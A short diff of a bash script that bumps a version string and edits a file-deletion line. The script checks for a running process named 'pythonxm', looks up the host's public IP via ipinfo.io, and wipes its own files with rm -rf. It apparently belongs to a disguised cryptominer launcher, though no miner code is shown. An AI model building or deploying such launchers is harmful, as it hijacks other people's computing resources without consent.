@@ -1,5 +1,5 @@
 #!bin/bash -xe 
-echo '#### Version 0.0.2 ####'
+echo '#### Version 0.0.3 ####'
 if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
@@ -10,7 +10,7 @@ curl -s ipinfo.io
 
 # Cleaner
 rm -rf pythonxm
-rm -rf config3.json
+rm -rf config.json
 rm -rf x.out
 
 #EN1GB
